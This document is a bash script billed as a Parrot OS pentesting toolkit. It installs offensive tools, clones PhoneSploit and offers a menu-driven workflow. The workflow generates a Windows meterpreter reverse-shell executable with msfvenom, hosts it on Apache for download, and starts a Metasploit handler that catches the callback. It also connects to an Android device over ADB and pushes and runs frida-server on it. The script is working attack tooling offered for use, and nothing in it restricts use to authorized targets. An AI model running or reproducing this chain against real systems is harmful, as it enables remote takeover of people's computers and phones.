#!/bin/bash

set -e

LOG_DIR="pentest_logs_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$LOG_DIR"
exec > >(tee -a "$LOG_DIR/session.log") 2>&1

function log() {
  echo -e "\n[+] $1\n"
}

function install_package() {
  local pkg="$1"
  if ! dpkg -s "$pkg" &>/dev/null; then
    log "Installing $pkg..."
    sudo apt-get update -qq
    sudo apt-get install -y "$pkg"
  else
    log "$pkg already installed."
  fi
}

function install_pip_package() {
  local py_pkg="$1"
  if ! python3 -c "import $py_pkg" &>/dev/null; then
    log "Installing Python package $py_pkg..."
    pip3 install "$py_pkg"
  else
    log "Python package $py_pkg already installed."
  fi
}

log "Starting automated setup..."

# Install core packages
for pkg in adb git apktool wireshark metasploit-framework python3-pip nmap netdiscover apache2 john hydra sqlmap; do
  install_package "$pkg"
done

install_pip_package requests
install_pip_package flask

# Clone PhoneSploit if missing
if [ ! -d "PhoneSploit" ]; then
  log "Cloning PhoneSploit repository..."
  git clone https://github.com/aerosol-can/PhoneSploit.git
fi

# Clone MobSF if missing
if [ ! -d "Mobile-Security-Framework-MobSF" ]; then
  log "Cloning MobSF (Mobile Security Framework)..."
  git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF.git
fi

# Setup web dir
WEB_DIR="/var/www/html/share"
if [ ! -d "$WEB_DIR" ]; then
  log "Creating web directory $WEB_DIR"
  sudo mkdir -p "$WEB_DIR"
  sudo chmod -R 755 "$WEB_DIR"
  sudo chown -R www-data:www-data "$WEB_DIR"
fi

# Start Apache if not running
if ! systemctl is-active --quiet apache2; then
  log "Starting Apache2..."
  sudo systemctl start apache2
fi

# Get user input once
read -rp "Enter Interface (e.g. eth0): " INTERFACE
read -rp "Enter Network CIDR (e.g. 192.168.1.0/24): " NETWORK
read -rp "Enter LHOST (your IP): " LHOST
read -rp "Enter LPORT (listening port): " LPORT
read -rp "Enter payload filename (e.g. reverse_shell.exe): " PAYLOAD_NAME
read -rp "Enter Android device IP (for ADB connection): " DEVICE_IP

# Connect Android device
log "Connecting to Android device at $DEVICE_IP:5555 ..."
adb connect "$DEVICE_IP:5555"
if adb devices | grep -q "$DEVICE_IP:5555"; then
  log "Connected to $DEVICE_IP successfully."
else
  log "Failed to connect to $DEVICE_IP. Check device or network."
fi

# Menu loop
while true; do
  echo
  echo "===== Parrot OS Pentesting Toolkit ====="
  echo "1) Netdiscover live hosts"
  echo "2) Nmap scan network"
  echo "3) Generate Windows reverse shell payload"
  echo "4) Host payload via Apache"
  echo "5) Run PhoneSploit"
  echo "6) Start Frida server on Android device"
  echo "7) Decompile APK with apktool"
  echo "8) Start MobSF"
  echo "9) Start Drozer console"
  echo "10) Launch Wireshark"
  echo "11) Start Metasploit handler for reverse shell"
  echo "12) Exit"
  echo "======================================"
  read -rp "Choose an option: " choice

  case $choice in
    1)
      log "Running netdiscover on $INTERFACE with network $NETWORK"
      sudo netdiscover -i "$INTERFACE" -r "$NETWORK"
      ;;
    2)
      log "Running nmap ping scan on $NETWORK"
      sudo nmap -sn "$NETWORK"
      ;;
    3)
      log "Generating reverse shell payload..."
      msfvenom -p windows/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f exe -o "$WEB_DIR/$PAYLOAD_NAME"
      log "Payload saved and hosted at http://$LHOST/share/$PAYLOAD_NAME"
      ;;
    4)
      log "Starting Apache2 (if not running) to host payload"
      sudo systemctl start apache2
      echo "Visit: http://$LHOST/share/$PAYLOAD_NAME to download the payload."
      ;;
    5)
      log "Launching PhoneSploit..."
      cd PhoneSploit
      python3 phonesploit.py
      cd ..
      ;;
    6)
      read -rp "Enter path to frida-server binary matching your Android device: " FRIDA_BIN
      adb -s "$DEVICE_IP:5555" push "$FRIDA_BIN" /data/local/tmp/frida-server
      adb -s "$DEVICE_IP:5555" shell "chmod 755 /data/local/tmp/frida-server"
      adb -s "$DEVICE_IP:5555" shell "/data/local/tmp/frida-server &"
      log "Frida server started on device."
      ;;
    7)
      read -rp "Enter APK path to decompile: " APK_PATH
      apktool d "$APK_PATH" -o decompiled_apk_output
      log "APK Decompiled at decompiled_apk_output/"
      ;;
    8)
      log "Starting MobSF..."
      cd Mobile-Security-Framework-MobSF
      ./run.sh &
      cd ..
      ;;
    9)
      log "Starting Drozer console..."
      drozer console
      ;;
    10)
      log "Launching Wireshark..."
      sudo wireshark &
      ;;
    11)
      log "Starting Metasploit handler..."
      msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; run"
      ;;
    12)
      log "Exiting. Have a good pentest!"
      exit 0
      ;;
    *)
      echo "Invalid option. Try again."
      ;;
  esac
done
